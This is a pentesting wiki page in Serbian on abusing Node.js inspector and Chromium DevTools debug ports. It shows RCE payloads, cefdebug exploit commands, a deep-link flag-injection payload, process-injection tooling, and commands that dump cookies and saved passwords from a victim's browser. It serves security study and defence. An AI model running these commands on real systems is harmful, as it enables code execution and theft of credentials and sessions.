# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Istorijski praktični primeri uključuju vodič Multimaster i napad debuggerom u Visual Studio Code-u, CVE-2019-1414; koristite ih kao kontekst specifičan za određene verzije, a ne kao pretpostavku da svaki aktuelni Electron ili Chromium cilj izlaže iste primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Osnovne informacije

[Iz dokumentacije](https://nodejs.org/learn/getting-started/debugging): Kada se pokrene sa prekidačem `--inspect`, Node.js proces osluškuje zahteve klijenta za debugging. **Podrazumevano**, osluškuje na hostu i portu **`127.0.0.1:9229`**. Svakom procesu se dodeljuje i **jedinstveni** **UUID**.<sup>[[4]](#references)</sup>

Inspector klijenti moraju da znaju i navedu adresu hosta, port i UUID da bi se povezali. Puna URL adresa izgleda otprilike ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Pošto **debugger ima pun pristup Node.js okruženju za izvršavanje**, zlonamerni akter koji može da se poveže na ovaj port možda će moći da izvršava proizvoljan kôd u ime Node.js procesa (**potencijalno povećanje privilegija**).<sup>[[4]](#references)</sup>

Postoji nekoliko načina za pokretanje inspectora:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Kada pokrenete proces koji se ispituje, pojaviće se nešto poput ovoga:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) mogu da izlože debugger pomoću opcije `--remote-debugging-port=9222`. Time se pregledač izlaže preko [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a ne preko Node.js inspectora, pa payloadi zasnovani na Node.js `process` objektu podrazumevano nisu direktno primenljivi.<sup>[[2]](#references)[[5]](#references)</sup>

Kada pokrenete pregledač u režimu debugovanja, pojaviće se nešto poput ovoga:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerisanje CDP endpointa i upravljanje njime

HTTP discovery endpointi razlikuju **browser** WebSocket od pojedinačnih WebSocket-ova za **target** (tab, worker, extension itd.). Za browser endpoint upitite `/json/version`, a za target-e `/json/list`; vraćene vrednosti `webSocketDebuggerUrl` zatim se mogu direktno koristiti za slanje CDP poruka nalik JSON-RPC-u.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Na primer, povežite se pomoću `websocat "$BROWSER_WS"` i pošaljite `{"id":1,"method":"Target.getTargets"}` ili `{"id":2,"method":"Storage.getCookies"}`. Na page target-u (`websocat "$PAGE_WS"`), `Runtime.evaluate` se izvršava u tom renderer-u, a `Page.captureScreenshot` vraća screenshot kodiran u base64. `document.cookie` ne može da otkrije `HttpOnly` cookies, dok `Storage.getCookies` traži cookies iz skladišta browser-a.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Pregledači, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Veb-sajtovi otvoreni u veb-pregledaču mogu da šalju WebSocket i HTTP zahteve u skladu sa bezbednosnim modelom pregledača. **Početna HTTP veza** neophodna je da bi se **dobio jedinstveni ID sesije debugger-a**. **Same-origin-policy** **sprečava** veb-sajtove da uspostave **ovu HTTP vezu**. Kao dodatnu zaštitu od [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da li **'Host' zaglavlja** veze navode ili **IP adresu** ili tačno **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ova **bezbednosna mera sprečava iskorišćavanje inspectora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo da se uradi iskorišćavanjem SSRF ranjivosti).<sup>[[4]](#references)</sup>

### Pokretanje inspectora u aktivnim procesima

Možete poslati **signal SIGUSR1** aktivnom Node.js procesu da biste ga naveli da **pokrene inspector** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljne privilegije, pa vam to može omogućiti **privilegovan pristup informacijama unutar procesa**, ali ne i direktnu eskalaciju privilegija.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Ovo je korisno u kontejnerima jer **gašenje procesa i pokretanje novog** sa opcijom `--inspect` **nije moguće**, pošto će **kontejner** biti **ugašen** zajedno sa procesom.<sup>[[6]](#references)</sup>

### Povezivanje sa inspector/debugger alatom

Da biste se povezali sa pregledačem zasnovanim na **Chromium-u**, možete da otvorite URL `chrome://inspect` ili `edge://inspect` za Chrome, odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Zatim će se prikazati URL za pristup debugger-u, npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debugger alatom: Da biste se povezali sa pregledačem zasnovanim na Chromium-u,...](<../../images/image (674).png>)

Pomoću **komandne linije** možete da se povežete sa debugger/inspector alatom:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava da **pronađe inspektore** koji se lokalno izvršavaju i da u njih **ubaci kod**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Imajte na umu da **NodeJS RCE exploits neće raditi** ako ste povezani sa browserom putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (treba da proverite API da biste pronašli zanimljive stvari koje možete da radite pomoću njega).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE u NodeJS Debugger/Inspector

> [!TIP]
> Ako ste došli ovde tražeći način da dobijete [**RCE pomoću XSS-a u Electronu, pogledajte ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Neki uobičajeni načini da dobijete **RCE** kada možete da se **povežete** na Node **inspector** uključuju korišćenje nečega poput (izgleda da ovo **neće raditi pri povezivanju na Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol payload-i

API možete proveriti ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
U ovom odeljku ću samo navesti zanimljive stvari za koje sam primetio da su ih ljudi koristili za exploit ovog protokola.

### Ograničenje podrazumevanog profila u Chrome 136+

Počevši od **Chrome 136**, Chrome ignoriše `--remote-debugging-port` i `--remote-debugging-pipe` kada ciljaju **podrazumevani Chrome direktorijum sa podacima**. Uz ove opcije mora da se koristi nestandardni `--user-data-dir`, čiji zaseban ključ za enkripciju i izolovano stanje pregledača sprečavaju da jednostavna tehnika zasnovana na zastavicama izloži uobičajeni, autentifikovani profil korisnika. Ne treba pretpostaviti da se ovo ograničenje specifično za Chrome odnosi i na starije verzije Chrome-a, Chrome for Testing, Electron/CEF aplikacije ili druge izvedenice Chromium-a bez provere.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Zato, činjenica da je pokrenut aktuelni Chrome proces samo sa opcijom `--remote-debugging-port` **ne** dokazuje da je CDP postao aktivan. Proverite listener i `/json/version` i utvrdite koji profil ga zapravo koristi.<sup>[[14]](#references)</sup>

### Ubrizgavanje parametara putem Deep Links

U slučaju [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino security je otkrio da je aplikacija zasnovana na CEF-u u sistemu **registrovala prilagođeni URI** (workspaces://index.html) koji je primao ceo URI, a zatim **pokretao aplikaciju zasnovanu na CEF-u** sa konfiguracijom koja je delimično konstruisana iz tog URI-ja.<sup>[[8]](#references)</sup>

Otkriveno je da su parametri URI-ja URL dekodirani i korišćeni za pokretanje osnovne CEF aplikacije, što je korisniku omogućavalo da **ubaci** zastavicu **`--gpu-launcher`** u **komandnu liniju** i izvrši proizvoljne radnje.<sup>[[8]](#references)</sup>

Dakle, payload poput ovog:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Izvršiće calc.exe.<sup>[[8]](#references)</sup>

### Prepisivanje datoteka

Promenite fasciklu u koju će se **preuzete datoteke čuvati** i preuzmite datoteku da biste **prepisali** često korišćen **izvorni kod** aplikacije svojim **zlonamernim kodom**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE i eksfiltracija

STAR Labs je pokazao da izloženi WebDriver/CDP servisi mogu omogućiti čitanje proizvoljnih fajlova i RCE; DNS rebinding može dovršiti exploit chain u nekim konfiguracijama.<sup>[[9]](#references)</sup>

ChromeDriver-ov WebDriver servis razlikuje se od Chrome DevTools/CDP-a. Njegova [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) određuje izvršnu datoteku browsera koja se pokreće za novu sesiju. Ako neprivilegovani caller može da pristupi ChromeDriver servisu koji radi kao root i pošalje sesiju sa putanjom do izvršne datoteke koju kontroliše, to pokretanje može preći granicu privilegija servisa. Prazan odgovor na `/sessions` ne utvrđuje da li je moguće kreirati nove sesije. Pre nego što zaključite da je ovaj put upotrebljiv, proverite vlasnika procesa, stvarnu dostupnost listenera, autorizaciju sesije, pristup izvršnoj datoteci i ograničenja okruženja; sam naziv procesa ili uobičajeni port nisu dovoljni. [Google-ove bezbednosne smernice](https://developer.chrome.com/docs/chromedriver/security-considerations) preporučuju pokretanje ChromeDriver-a pod neprivilegovanim nalogom. Pasivno enumerisanje ne bi trebalo da kreira WebDriver sesiju.

Za dodatne istorijske slučajeve automatizacije browsera i Chromium bezbednosti, pogledajte Counter WebDriver write-up i Project Zero probleme 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Omogućavanje CDP-a unutar aktivnog Chromium procesa

Chrome-ovo ograničenje za podrazumevani profil blokira samo aktivaciju preko komandne linije. Uz dovoljan pristup istog korisnika za manipulisanje browser procesom, оригинални [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) и Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) позивају Chromium-ов non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` унутар већ покренутог `chrome.exe` или `msedge.exe`. Зато endpoint припада стварном профилу и задржава његове табове, екстензије, колачиће и аутентификовано стање.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

За уобичајене x64 Chrome/Edge процесе, BOF проналази browser прозор и учитани `chrome.dll`/`msedge.dll`, претражује удаљени PE у потрази за маскираним потписима, алоцира stub-ове и context block, привремено замењује window procedure и шаље коначни позив на browser **UI thread**. Релевантни runtime улази су `StartRemoteDebuggingServer`, Chromium-ов `operator new`, `TCPServerSocketFactory::CreateForHttpServer` и factory vtable. Извршавање се прекида ако било који обавезни потпис нема јединствено поклапање.<sup>[[15]](#references)[[16]](#references)</sup>

BOF прихвата режим browser-а и опциони порт. Његова помоћна скрипта затим може да провери endpoint и прикупи колачиће; `chrome-iso` је засебан пут за Windows Process Isolation границу у Chrome-у.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Putanja `chrome-iso` koristi samo handle-ove sa ograničenim pravima upita ka izolovanom procesu. Identifikuje instalirani `chrome.dll` čija se veličina PE slike poklapa sa veličinom slike aktivnog procesa, razrešava simbole iz te lokalne slike i koristi Chromium-ov `WindowImpl` dispatch, sinhroni `WM_COPYDATA` i postojeći User32 hook u već učitanoj slici da bi došla do UI niti.<sup>[[16]](#references)</sup>

> [!WARNING]
> Ovo je tehnika **manipulacije procesom browsera nakon kompromitovanja**, a ne zaobilaženje autentifikacije preko mreže. Zavisi od build-a, jer relevantni C++ simboli nisu izvezeni i mogu se promeniti nakon ažuriranja browsera.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Osvežavanje potpisa nakon ažuriranja browsera

Koristite tačnu verziju `chrome.dll` ili `msedge.dll` instaliranu na ciljnom sistemu i njen odgovarajući PDB. `symchk.exe` iz Windows SDK-a preuzima simbole; zatim skripte u repozitorijumu pronalaze `StartRemoteDebuggingServer`, određuju ulaze za allocator/socket-factory ili proveravaju svaki potpis ugrađen u BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Rezultat sa nula ili više pogodaka ne sme se zameniti proizvoljnom adresom. Ako se poznati obrazac `operator new` ili `CreateForHttpServer` previše promenio da bi poslužio za pravljenje nove maske, upotrebite `pe_signature_finder.py` sa PDB-om da pregledate taj simbol i izvedete niz bajtova koji je jedinstven u ciljnom modulu.<sup>[[16]](#references)[[18]](#references)</sup>

#### Izdvajanje iz autentifikovanog pregledača pomoću CDP Toolkit-a

Ova tehnika ne dešifruje App-Bound Encryption (ABE) van mreže niti uklanja vezivanje za uređaj. Umesto toga, koristi legitimni pregledač kao **decryption oracle i proxy za autentifikovanu interakciju**: `Storage.getCookies` traži od pokrenutog pregledača pristup skladištu kolačića, dok tokovi rada za navigaciju/screencast zadržavaju zahteve, skladište, autentifikaciju preduzeća i ponašanje vezano za uređaj unutar postojećeg pregledača žrtve.<sup>[[17]](#references)[[18]](#references)</sup>

Nakon prosleđivanja loopback CDP listener-a kroz pivot operatera, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) može da nabroji i prikupi uobičajene artefakte.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` i `tabs screenshot` uglavnom su omotači za `/json/version`, listu ciljnih stranica, `Storage.getCookies` i `Page.captureScreenshot`. Za istoriju, obeleživače, ekstenzije i metapodatke o lozinkama potreban je privremeni WebUI target `chrome://`/`edge://`: toolkit sačeka da se prikaz učita, pregleda njegov model ili DOM, prikupi rezultat i zatvori target.<sup>[[17]](#references)[[18]](#references)</sup>

` saved-passwords dump` ide korak dalje: otvara stvarni origin sa sačuvanim prijavljivanjem, fokusira polje za unos podataka za prijavu, bira izvornu sugestiju za automatsko popunjavanje pomoću CDP ulaznih događaja i čita popunjene vrednosti. Origin/port/path moraju se u velikoj meri poklapati sa realm-om sačuvane lozinke; vidljivi režim je pouzdan podrazumevani izbor jer je iskačući prozor sa sugestijama izvorni deo korisničkog interfejsa pregledača.<sup>[[17]](#references)[[18]](#references)</sup>

Za interakciju uživo, `browser-takeover screencast` prenosi frejmove i šalje ulazne događaje stvarnom targetu (uključujući pozadinski režim ili režim van ekrana). `browser-takeover proxy` umesto toga lokalno prihvata HTTP i HTTPS `CONNECT` i šalje upstream zahteve preko skrivenih Chrome targeta, a kada skriveni targeti nisu dostupni, koristi pozadinske tabove; time se čuva mrežni/autentifikacioni kontekst žrtve, ali je manje veran za složene klijentske aplikacije jer pregledač operatora prikazuje vraćeni sadržaj.<sup>[[17]](#references)[[18]](#references)</sup>

Za detekciju nemojte se oslanjati samo na telemetriju komandne linije `--remote-debugging-*`: korelišite i neuobičajene handles i memorijske operacije nad procesima pregledača (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, kreiranje niti), DLL injection i neočekivane loopback listening sockets koje koriste Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

U stvarnom okruženju, **nakon kompromitovanja** korisničkog računara na kom se koristi pregledač zasnovan na Chromium-u, istorijska tehnika bila je ponovno pokretanje pregledača sa uključenim debugging-om i prosleđivanje loopback porta. Time se može izložiti stanje pregledanja žrtve na proizvodima/izdanjima koji i dalje prihvataju izabrani profil, ali Chrome 136+ to neće dozvoliti za svoj podrazumevani direktorijum sa podacima.<sup>[[7]](#references)[[14]](#references)</sup>

Originalna komanda za ponovno pokretanje sačuvana je ispod za starije/ciljano određene verzije. Druga komanda predstavlja podržani način rada u aktuelnom Chrome-u, ali kreira izolovani profil umesto da ponovo otvori uobičajeno autentifikovano stanje žrtve.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Za macOS-specifične tehnike ponovnog pokretanja Chromium-a, ekstenzija i CDP-a, pogledajte [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Alat za pregledanje i iskorišćavanje CEF/Chromium debugger-a](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution u Visual Studio Code-u preko Chrome DevTools Debugger-a](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js vodič za debugging - Početak](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [CorCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Zloupotreba Chrome-ove debugging funkcije za daljinsko posmatranje i kontrolu sesija pregledanja](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution u AWS WorkSpaces-u](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Pričaš sa mnom? - WebDriver RCE preko DNS rebinding-a i CDP-a (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Od bot-a do RCE-a](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Izmene prekidača za remote debugging radi poboljšanja bezbednosti - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Ubacivanje CDP-a u pokrenuti Edge Browser: Detaljan pregled instrumentacije browser-a tokom rada](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Povratak Cookie Monster-a](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
